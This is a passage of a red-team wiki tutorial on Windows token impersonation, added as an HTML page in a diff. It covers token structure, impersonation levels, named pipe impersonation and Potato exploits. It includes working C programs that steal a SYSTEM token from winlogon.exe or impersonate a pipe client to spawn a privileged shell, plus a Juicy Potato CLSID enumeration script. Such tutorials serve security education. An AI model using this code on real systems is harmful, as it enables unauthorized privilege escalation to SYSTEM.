@@ -1,0 +1,1514 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Token Impersonation | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Token Impersonation">
+		<meta name="keywords" content="access-tokens, kerberos, linux-credentials, potato-exploits, redteam, token-impersonation, uac, windows">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Token Impersonation">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Windows access token structure, token theft, named pipe impersonation, Potato exploits (SeImpersonatePrivilege), UAC token filtering, Kerberos delegation, and Linux credential passing via Unix sockets.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/token-impersonation.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Token Impersonation">
+		<meta name="twitter:description" itemprop="description" content="Windows access token structure, token theft, named pipe impersonation, Potato exploits (SeImpersonatePrivilege), UAC token filtering, Kerberos delegation, and Linux credential passing via Unix sockets.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-windows-access-token">The Windows Access Token</a></b>
+					<ul>
+						<li><a href="#enumerate-your-token">Enumerate Your Token</a></li>
+						<li><a href="#token-info-in-c">Token Info in C</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#token-types-primary-vs-impersonation">Token Types: Primary vs Impersonation</a></b>
+					<ul>
+						<li><a href="#primary-token">Primary Token</a></li>
+						<li><a href="#impersonation-token">Impersonation Token</a></li>
+						<li><a href="#token-lifecycle">Token Lifecycle</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#impersonation-levels">Impersonation Levels</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#token-stealing-the-core-primitive">Token Stealing - The Core Primitive</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#named-pipe-impersonation">Named Pipe Impersonation</a></b>
+					<ul>
+						<li><a href="#printspoofer-pipepotato-technique">PrintSpoofer / PipePotato Technique</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-potato-exploit-family">The Potato Exploit Family</a></b>
+					<ul>
+						<li><a href="#juicy-potato-clsid">Juicy Potato CLSID</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#uac-token-filtering-and-linked-tokens">UAC Token Filtering and Linked Tokens</a></b>
+					<ul>
+						<li><a href="#token-kidnapping">Token Kidnapping</a></li>
+						<li><a href="#powershell-token-enum">PowerShell Token Enum</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#kerberos-delegation-tokens">Kerberos Delegation Tokens</a></b>
+					<ul>
+						<li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+						<li><a href="#constrained-delegation">Constrained Delegation</a></li>
+						<li><a href="#resource-based-constrained-delegation">Resource-Based Constrained Delegation</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-equivalent-credential-passing">Linux Equivalent - Credential Passing</a></b>
+					<ul>
+						<li><a href="#uidgid">UID/GID</a></li>
+						<li><a href="#capabilities">Capabilities</a></li>
+						<li><a href="#unix-socket-credential-passing">Unix Socket Credential Passing</a></li>
+						<li><a href="#compile-and-test">Compile and Test</a></li>
+						<li><a href="#linux-credential-inspect">Linux Credential Inspect</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#meterpreter-token-workflow">meterpreter Token Workflow</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-commands-windows">Verification Commands - Windows</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-commands-linux">Verification Commands - Linux</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/token-impersonation.html">Token Impersonation</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="token-impersonation">Token Impersonation</h2>
+					<p>
+						Windows access token structure, token theft, named pipe impersonation, Potato exploits (SeImpersonatePrivilege),
+						<abbr title="User Account Control">UAC</abbr>
+						token filtering, Kerberos delegation, and Linux credential passing
+						via Unix sockets.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Windows access tokens are the kernel objects that carry a process identity, and stealing or
+							impersonating one turns a foothold into SYSTEM. This article covers token structure, primary
+							versus impersonation tokens, named pipe impersonation with
+							<code>SeImpersonatePrivilege</code>
+							, the Potato
+							exploit family,
+							<abbr title="User Account Control">UAC</abbr>
+							token filtering, and Kerberos delegation. It closes
+							with the Linux equivalents: UID transitions, capabilities, and
+							<code>SCM_CREDENTIALS</code>
+							passing over
+							Unix domain sockets. By the end you can explain each privilege escalation primitive and where
+							it fails.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process credentials, UID/GID, kernel credential structures</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">Authentication</a> - authentication mechanisms, Kerberos, Pluggable Authentication Modules ( <code>PAM</code> )</li>
+							<li><a href="/wiki/articles/fundamentals/authorization.html">Authorization</a> - access control models, discretionary and mandatory access control, <abbr title="Access Control List">ACL</abbr> rules</li>
+							<li><a href="/wiki/articles/fundamentals/unix-permissions.html">Unix Permissions</a> - UID/EUID/SUID, setuid/seteuid system calls</li>
+							<li><a href="/wiki/articles/fundamentals/capabilities.html">Capabilities</a> - Linux capabilities model, ambient capabilities</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-windows-access-token">The Windows Access Token</h3>
+						<p>
+							Every Windows process carries an
+							<b>access token</b>
+							- a kernel object representing the process's
+							security context. When a thread opens a file, accesses a registry key, or interacts with any
+							securable object, the Security Reference Monitor (SRM) compares the token against the object's
+							<abbr title="Access Control List">ACL</abbr>
+							.
+						</p>
+						<p>
+							An access token is created at logon by
+							<abbr title="Local Security Authority Subsystem Service">LSASS</abbr>
+							and
+							contains:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Field</th>
+									<th align="center">Description</th>
+									<th align="center">Example</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">User SID</td>
+									<td align="center">Who you are</td>
+									<td align="center"><code>S-1-5-21-3852-1155-500</code>(Administrator)</td>
+								</tr>
+								<tr>
+									<td align="center">Group SIDs</td>
+									<td align="center">Group memberships</td>
+									<td align="center">Domain Admins, Remote Desktop Users</td>
+								</tr>
+								<tr>
+									<td align="center">Privileges</td>
+									<td align="center">Local system rights</td>
+									<td align="center">SeDebugPrivilege, SeImpersonatePrivilege</td>
+								</tr>
+								<tr>
+									<td align="center">Default DACL</td>
+									<td align="center">ACL applied to created objects</td>
+									<td align="center">Default owner rights</td>
+								</tr>
+								<tr>
+									<td align="center">Token Type</td>
+									<td align="center">Primary vs Impersonation</td>
+									<td align="center">Process vs thread level</td>
+								</tr>
+								<tr>
+									<td align="center">Impersonation Level</td>
+									<td align="center">How far impersonation reaches</td>
+									<td align="center">Identification, Impersonation, Delegation</td>
+								</tr>
+								<tr>
+									<td align="center">Integrity Level</td>
+									<td align="center">UAC sandboxing</td>
+									<td align="center">Low, Medium, High, System</td>
+								</tr>
+								<tr>
+									<td align="center">Session ID</td>
+									<td align="center">Terminal Services session</td>
+									<td align="center">Session 0 (services), Session 1+ (console)</td>
+								</tr>
+								<tr>
+									<td align="center">Logon SID</td>
+									<td align="center">Unique per logon session</td>
+									<td align="center">Identifies the logon</td>
+								</tr>
+								<tr>
+									<td align="center">Origin</td>
+									<td align="center">Token source</td>
+									<td align="center">LSASS logon, NtCreateToken, duplication</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="enumerate-your-token">Enumerate Your Token</h4>
+						<pre class="powershell">
+# PowerShell — full token dump
+whoami /all
+
+# Individual fields
+whoami /user          # SID
+whoami /groups        # Group memberships
+whoami /priv          # Privileges (enabled vs disabled)
+						</pre>
+						<h4 id="token-info-in-c">Token Info in C</h4>
+						<pre class="c">
+/*
+ * token_info.c — Read process and thread token info
+ * Cross-compile: x86_64-w64-mingw32-gcc -o token_info.exe token_info.c
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+void print_token_details(HANDLE hToken)
+{
+    DWORD tokenType = 0, returnLen = 0;
+
+    if (GetTokenInformation(hToken, TokenType,
+        &amp;tokenType, sizeof(tokenType), &amp;returnLen)) {
+        printf(&#34;  Type: %s\n&#34;,
+            tokenType == TokenPrimary ? &#34;Primary&#34; : &#34;Impersonation&#34;);
+    }
+
+    if (tokenType == TokenImpersonation) {
+        SECURITY_IMPERSONATION_LEVEL impLevel;
+        if (GetTokenInformation(hToken, TokenImpersonationLevel,
+            &amp;impLevel, sizeof(impLevel), &amp;returnLen)) {
+            const char *levels[] = {
+                &#34;Anonymous&#34;, &#34;Identification&#34;, &#34;Impersonation&#34;, &#34;Delegation&#34;
+            };
+            printf(&#34;  ImpersonationLevel: %s\n&#34;, levels[impLevel]);
+        }
+    }
+
+    /* Get user SID */
+    BYTE tokenUserBuf[256];
+    PTOKEN_USER tokenUser = (PTOKEN_USER)tokenUserBuf;
+    if (GetTokenInformation(hToken, TokenUser,
+        tokenUser, sizeof(tokenUserBuf), &amp;returnLen)) {
+        LPSTR sidString;
+        ConvertSidToStringSidA(tokenUser-&gt;User.Sid, &amp;sidString);
+        printf(&#34;  User SID: %s\n&#34;, sidString);
+        LocalFree(sidString);
+    }
+}
+
+int main(void)
+{
+    HANDLE hProcessToken, hThreadToken;
+
+    if (OpenProcessToken(GetCurrentProcess(),
+        TOKEN_QUERY, &amp;hProcessToken)) {
+        printf(&#34;Process primary token:\n&#34;);
+        print_token_details(hProcessToken);
+        CloseHandle(hProcessToken);
+    }
+
+    if (OpenThreadToken(GetCurrentThread(),
+        TOKEN_QUERY, FALSE, &amp;hThreadToken)) {
+        printf(&#34;Thread token:\n&#34;);
+        print_token_details(hThreadToken);
+        CloseHandle(hThreadToken);
+    } else {
+        printf(&#34;Thread token: not impersonating (using process token)\n&#34;);
+    }
+
+    return 0;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="token-types-primary-vs-impersonation">Token Types: Primary vs Impersonation</h3>
+						<h4 id="primary-token">Primary Token</h4>
+						<p>
+							Attached to a process at creation time. Contains the complete security context. Every process
+							has exactly one primary token. Threads inherit the process primary token by default unless explicitly
+							assigned an impersonation token.
+						</p>
+						<h4 id="impersonation-token">Impersonation Token</h4>
+						<p>
+							Attached to a thread. Created when a server impersonates a client (named pipe,
+							<abbr title="Remote Procedure Call">RPC</abbr>
+							, COM). The thread runs with the client's security context. The thread reverts to its process
+							primary token via
+							<code>RevertToSelf()</code>
+							.
+						</p>
+						<h4 id="token-lifecycle">Token Lifecycle</h4>
+						<pre class="plaintext">
+User logs on
+    │
+    ▼
+LSASS creates primary token
+    │
+    ▼
+winlogon/userinit starts first process with this primary token
+    │
+    ▼
+Child processes inherit primary token (via CreateProcess)
+    │                       │
+    │                       ▼
+    │               Server: accept client connection
+    │                  (named pipe, RPC, COM)
+    │                       │
+    │                       ▼
+    │               Create impersonation token for client
+    │                       │
+    │                       ▼
+    │               Thread: ImpersonateLoggedOnUser()
+    │                       │
+    │                       ▼
+    │               Thread runs as client user
+    │                       │
+    │                       ▼
+    │               Thread: RevertToSelf() — back to process token
+    │
+    ▼
+Process exits — primary token destroyed
+						</pre>
+					</section>
+					<section>
+						<h3 id="impersonation-levels">Impersonation Levels</h3>
+						<p>
+							When a thread impersonates, the level determines how much authority the impersonated identity
+							carries:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Level</th>
+									<th align="center">Value</th>
+									<th align="center">Access Local</th>
+									<th align="center">Access Remote</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">SecurityAnonymous</td>
+									<td align="center">1</td>
+									<td align="center">No</td>
+									<td align="center">No</td>
+								</tr>
+								<tr>
+									<td align="center">SecurityIdentification</td>
+									<td align="center">2</td>
+									<td align="center">Inspect SIDs only</td>
+									<td align="center">No</td>
+								</tr>
+								<tr>
+									<td align="center">SecurityImpersonation</td>
+									<td align="center">3</td>
+									<td align="center">Yes (full local)</td>
+									<td align="center">No</td>
+								</tr>
+								<tr>
+									<td align="center">SecurityDelegation</td>
+									<td align="center">4</td>
+									<td align="center">Yes (full local)</td>
+									<td align="center">Yes (Kerberos)</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							The client sets the maximum impersonation level when connecting. A server cannot exceed what
+							the client grants. For named pipes, the client specifies this in
+							<code>CreateFile</code>
+							's
+							<code>dwFlagsAndAttributes</code>
+							parameter via
+							<code>SECURITY_SQOS_PRESENT</code>
+							.
+						</p>
+						<pre class="c">
+/*
+ * named_pipe_client.c — Connect with specific impersonation level
+ * Compile: x86_64-w64-mingw32-gcc -o pipe_client.exe named_pipe_client.c
+ *
+ * Run this: pipe_client.exe
+ * Meanwhile, a server on \\.\pipe\testpipe reads the impersonation level.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(void)
+{
+    /* Connect with SecurityImpersonation — the server can impersonate us */
+    HANDLE hPipe = CreateFileA(
+        &#34;\\\\\\\\.\\\\pipe\\\\testpipe&#34;,
+        GENERIC_READ | GENERIC_WRITE,
+        0, NULL, OPEN_EXISTING, 0, NULL);
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf(&#34;[-] Could not connect to pipe (no server listening?)\n&#34;);
+        printf(&#34;    CreateFileA error: %lu\n&#34;, GetLastError());
+        return 1;
+    }
+
+    /* Send our token info over the pipe */
+    HANDLE hToken;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken);
+
+    /* Server now calls ImpersonateNamedPipeClient(hPipe)
+     * and can access local resources as us. */
+    printf(&#34;[+] Connected. Server can impersonate at our allowed level.\n&#34;);
+
+    /* Wait for server to process */
+    Sleep(5000);
+    CloseHandle(hPipe);
+    return 0;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="token-stealing-the-core-primitive">Token Stealing - The Core Primitive</h3>
+						<p>
+							Token stealing duplicates a token from another process and assigns it to your thread. The classic
+							meterpreter flow:
+						</p>
+						<pre class="plaintext">
+1. Enable SeDebugPrivilege (required to open SYSTEM tokens)
+2. Enumerate processes via CreateToolhelp32Snapshot
+3. For each process, open with PROCESS_QUERY_INFORMATION
+4. OpenProcessToken with TOKEN_DUPLICATE | TOKEN_IMPERSONATE
+5. DuplicateTokenEx to create a primary token
+6. CreateProcessWithTokenW to spawn a shell with the stolen token
+						</pre>
+						<pre class="c">
+/*
+ * token_steal.c — Steal a SYSTEM token and spawn a shell
+ * Cross-compile: x86_64-w64-mingw32-gcc -o token_steal.exe token_steal.c
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL enable_privilege(LPCSTR privilegeName)
+{
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {
+        return FALSE;
+    }
+
+    if (!LookupPrivilegeValueA(NULL, privilegeName, &amp;luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    BOOL result = AdjustTokenPrivileges(
+        hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    return result &amp;&amp; GetLastError() == ERROR_SUCCESS;
+}
+
+DWORD find_system_process(void)
+{
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(entry);
+    DWORD pid = 0;
+
+    if (Process32First(snapshot, &amp;entry)) {
+        do {
+            /* winlogon.exe, lsass.exe, services.exe run as SYSTEM */
+            if (_stricmp(entry.szExeFile, &#34;winlogon.exe&#34;) == 0) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snapshot, &amp;entry));
+    }
+
+    CloseHandle(snapshot);
+    return pid;
+}
+
+int main(void)
+{
+    /* Step 1: Enable SeDebugPrivilege */
+    printf(&#34;[*] Enabling SeDebugPrivilege...\n&#34;);
+    if (!enable_privilege(SE_DEBUG_NAME)) {
+        printf(&#34;[-] SeDebugPrivilege not available (run as admin)\n&#34;);
+        return 1;
+    }
+    printf(&#34;[+] SeDebugPrivilege enabled\n&#34;);
+
+    /* Step 2: Find a SYSTEM process */
+    DWORD systemPid = find_system_process();
+    if (!systemPid) {
+        printf(&#34;[-] No SYSTEM process found\n&#34;);
+        return 1;
+    }
+    printf(&#34;[+] Found SYSTEM process: PID %lu\n&#34;, systemPid);
+
+    /* Step 3: Open the SYSTEM process and its token */
+    HANDLE hProcess = OpenProcess(
+        PROCESS_QUERY_INFORMATION, FALSE, systemPid);
+    if (!hProcess) {
+        printf(&#34;[-] OpenProcess failed: %lu\n&#34;, GetLastError());
+        return 1;
+    }
+
+    HANDLE hSystemToken;
+    if (!OpenProcessToken(hProcess,
+        TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
+        &amp;hSystemToken)) {
+        printf(&#34;[-] OpenProcessToken failed: %lu\n&#34;, GetLastError());
+        CloseHandle(hProcess);
+        return 1;
+    }
+    printf(&#34;[+] Opened SYSTEM token\n&#34;);
+
+    /* Step 4: Duplicate the token as a primary token */
+    HANDLE hDupToken;
+    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &amp;hDupToken)) {
+        printf(&#34;[-] DuplicateTokenEx failed: %lu\n&#34;, GetLastError());
+        CloseHandle(hSystemToken);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    /* Step 5: Spawn a process with the stolen token */
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.lpDesktop = &#34;WinSta0\\Default&#34;;
+
+    if (!CreateProcessWithTokenW(hDupToken, 0,
+        L&#34;cmd.exe&#34;, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi)) {
+        printf(&#34;[-] CreateProcessWithTokenW failed: %lu\n&#34;, GetLastError());
+    } else {
+        printf(&#34;[+] SYSTEM shell created (PID: %lu)\n&#34;, pi.dwProcessId);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    CloseHandle(hDupToken);
+    CloseHandle(hSystemToken);
+    CloseHandle(hProcess);
+    return 0;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="named-pipe-impersonation">Named Pipe Impersonation</h3>
+						<p>
+							<code>SeImpersonatePrivilege</code>
+							is granted by default to: - Local Administrators - Local Service accounts
+							(including IIS,
+							<abbr title="Structured Query Language">SQL</abbr>
+							Server) - Network Service account - SERVICE accounts
+						</p>
+						<p>
+							If your process holds
+							<code>SeImpersonatePrivilege</code>
+							, you can impersonate
+							<b>any</b>
+							user that connects
+							to a resource you control. The attack pattern:
+						</p>
+						<pre class="plaintext">
+[Attacker (with SeImpersonatePrivilege)]
+    │
+    ├── Create named pipe (e.g., \\.\pipe\spoolss)
+    │
+    ├── Trick SYSTEM into connecting to the pipe
+    │       (NTLM reflection, COM activation, RPC callback)
+    │
+    ├── Wait for connection from SYSTEM
+    │
+    └── ImpersonateNamedPipeClient() → run as SYSTEM
+						</pre>
+						<h4 id="printspoofer-pipepotato-technique">PrintSpoofer / PipePotato Technique</h4>
+						<p>
+							PrintSpoofer exploits the fact that the Spooler service (running as SYSTEM) connects to a named
+							pipe when a print job is queued. By creating a pipe with a specific name and triggering a print
+							operation, SYSTEM connects and the attacker impersonates.
+						</p>
+						<pre class="c">
+/*
+ * named_pipe_impersonate.c — Named pipe impersonation foundation
+ * Cross-compile: x86_64-w64-mingw32-gcc -o np_impersonate.exe named_pipe_impersonate.c
+ *
+ * This demonstrates the core technique. Combined with a coercion
+ * method (RPC, DCOM, printer bug), it becomes a Potato exploit.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(void)
+{
+    /* Check for SeImpersonatePrivilege */
+    HANDLE hToken;
+    BOOL hasImpersonate = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcess(),
+        TOKEN_QUERY, &amp;hToken)) {
+        /* Check privilege */
+        PRIVILEGE_SET privSet;
+        LUID luid;
+        LookupPrivilegeValueA(NULL, SE_IMPERSONATE_NAME, &amp;luid);
+
+        privSet.PrivilegeCount = 1;
+        privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
+        privSet.Privilege[0].Luid = luid;
+        privSet.Privilege[0].Attributes = 0;
+
+        if (PrivilegeCheck(hToken, &amp;privSet, &amp;hasImpersonate)) {
+            printf(&#34;[%s] SeImpersonatePrivilege\n&#34;,
+                hasImpersonate ? &#34;+&#34; : &#34;-&#34;);
+        }
+        CloseHandle(hToken);
+    }
+
+    if (!hasImpersonate) {
+        printf(&#34;[-] SeImpersonatePrivilege not available\n&#34;);
+        return 1;
+    }
+
+    /* Create a named pipe */
+    printf(&#34;[*] Creating named pipe: \\\\.\\pipe\\testimp\n&#34;);
+    HANDLE hPipe = CreateNamedPipeA(
+        &#34;\\\\.\\pipe\\testimp&#34;,
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_WAIT,
+        1,           /* max instances */
+        0, 0, 0, NULL);
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf(&#34;[-] CreateNamedPipe failed: %lu\n&#34;, GetLastError());
+        return 1;
+    }
+
+    /* Wait for a client (SYSTEM) to connect */
+    printf(&#34;[*] Waiting for client connection...\n&#34;);
+    printf(&#34;[*] (In a real attack, trigger a SYSTEM process to connect)\n&#34;);
+
+    if (!ConnectNamedPipe(hPipe, NULL) &amp;&amp;
+        GetLastError() != ERROR_PIPE_CONNECTED) {
+        printf(&#34;[-] ConnectNamedPipe failed: %lu\n&#34;, GetLastError());
+        CloseHandle(hPipe);
+        return 1;
+    }
+
+    printf(&#34;[+] Client connected\n&#34;);
+
+    /* Read a byte from the pipe */
+    BYTE buf;
+    DWORD bytesRead;
+    ReadFile(hPipe, &amp;buf, 1, &amp;bytesRead, NULL);
+
+    /* Impersonate the client */
+    if (!ImpersonateNamedPipeClient(hPipe)) {
+        printf(&#34;[-] ImpersonateNamedPipeClient failed: %lu\n&#34;,
+            GetLastError());
+        CloseHandle(hPipe);
+        return 1;
+    }
+
+    printf(&#34;[+] Now impersonating the client\n&#34;);
+
+    /* Verify the new identity */
+    HANDLE hThreadToken;
+    OpenThreadToken(GetCurrentThread(),
+        TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, &amp;hThreadToken);
+
+    BYTE userBuf[256];
+    PTOKEN_USER tokenUser = (PTOKEN_USER)userBuf;
+    DWORD returnLen;
+    GetTokenInformation(hThreadToken, TokenUser,
+        tokenUser, sizeof(userBuf), &amp;returnLen);
+
+    LPSTR sidString;
+    ConvertSidToStringSidA(tokenUser-&gt;User.Sid, &amp;sidString);
+    printf(&#34;[+] Impersonated user SID: %s\n&#34;, sidString);
+    LocalFree(sidString);
+
+    /* As the impersonated user, spawn a process.
+     * CreateProcessWithTokenW needs a primary token, so duplicate
+     * the thread&#39;s impersonation token first. */
+    HANDLE hPrimaryToken;
+    if (!DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &amp;hPrimaryToken)) {
+        printf(&#34;[-] DuplicateTokenEx failed: %lu\n&#34;, GetLastError());
+        RevertToSelf();
+        CloseHandle(hPipe);
+        return 1;
+    }
+
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.lpDesktop = &#34;WinSta0\\Default&#34;;
+
+    if (CreateProcessWithTokenW(hPrimaryToken, 0,
+        L&#34;cmd.exe&#34;, NULL, CREATE_NEW_CONSOLE,
+        NULL, NULL, &amp;si, &amp;pi)) {
+        printf(&#34;[+] Shell spawned as impersonated user (PID: %lu)\n&#34;,
+            pi.dwProcessId);
+    } else {
+        printf(&#34;[-] CreateProcessWithTokenW failed: %lu\n&#34;,
+            GetLastError());
+    }
+
+    CloseHandle(hPrimaryToken);
+    CloseHandle(hThreadToken);
+    RevertToSelf();
+    CloseHandle(hPipe);
+    return 0;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="the-potato-exploit-family">The Potato Exploit Family</h3>
+						<p>
+							The "Potato" exploit family chains
+							<code>SeImpersonatePrivilege</code>
+							with various coercion techniques
+							to get SYSTEM to connect to the attacker-controlled pipe.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Exploit</th>
+									<th align="center">Coercion Method</th>
+									<th align="center">Works On</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Hot Potato</td>
+									<td align="center">NBNS spoofing -> NTLM relay</td>
+									<td align="center">Win 7, 8, 10, Server 2008/2012</td>
+								</tr>
+								<tr>
+									<td align="center">Rotten Potato</td>
+									<td align="center">DCOM activation + NTLM reflection</td>
+									<td align="center">Win 10 < 1809, Server 2016</td>
+								</tr>
+								<tr>
+									<td align="center">Juicy Potato</td>
+									<td align="center">CLSID-based DCOM -> NTLM auth</td>
+									<td align="center">Win 10, Server 2012/2016, limited post-1809</td>
+								</tr>
+								<tr>
+									<td align="center">Rogue Potato</td>
+									<td align="center">Remote OXID resolver</td>
+									<td align="center">Win 10 1809+, Server 2019</td>
+								</tr>
+								<tr>
+									<td align="center">Sweet Potato</td>
+									<td align="center">EFSRPC callback + multiple triggers</td>
+									<td align="center">Win 10, Server 2019 (specific builds)</td>
+								</tr>
+								<tr>
+									<td align="center">PrintSpoofer</td>
+									<td align="center">Spooler RPC -> named pipe</td>
+									<td align="center">Windows Server 2019, Win 10 1809+</td>
+								</tr>
+								<tr>
+									<td align="center">GodPotato</td>
+									<td align="center">COM loopback + NETONLY impersonation</td>
+									<td align="center">Win 10/11, Server 2012-2022</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>The core workflow for all Potato variants:</p>
+						<pre class="plaintext">
+[1] Create a named pipe (listening for SYSTEM)
+[2] Find a COM interface / RPC endpoint that SYSTEM calls
+[3] Configure the callback to point at the named pipe
+[4] Trigger the COM/RPC call → SYSTEM connects to pipe
+[5] ImpersonateNamedPipeClient() → run as SYSTEM
+[6] DuplicateTokenEx() → get a primary token
+[7] CreateProcessWithTokenW() → spawn SYSTEM shell
+						</pre>
+						<h4 id="juicy-potato-clsid">Juicy Potato CLSID</h4>
+						<p>
+							The CLSID (Class Identifier) determines which COM object SYSTEM instantiates. On a Windows 10
+							system, thousands of CLSIDs exist. The relevant ones for Juicy Potato are those with
+							<code>LaunchPermission</code>
+							that allow the current user to launch, and that run as SYSTEM:
+						</p>
+						<pre class="powershell">
+# Find viable CLSIDs for Juicy Potato
+# Requires a test harness, but conceptually:
+$regPath = &#34;HKLM:\SOFTWARE\Classes\CLSID&#34;
+Get-ChildItem -Path $regPath | ForEach-Object {
+    $clsid = $_.PSChildName
+    $appId = (Get-ItemProperty -Path &#34;$regPath\$clsid&#34; -Name AppID -ErrorAction SilentlyContinue).AppID
+    if ($appId) {
+        # Check the AppID&#39;s launch permission
+        $appIdPath = &#34;HKLM:\SOFTWARE\Classes\AppID\$appId&#34;
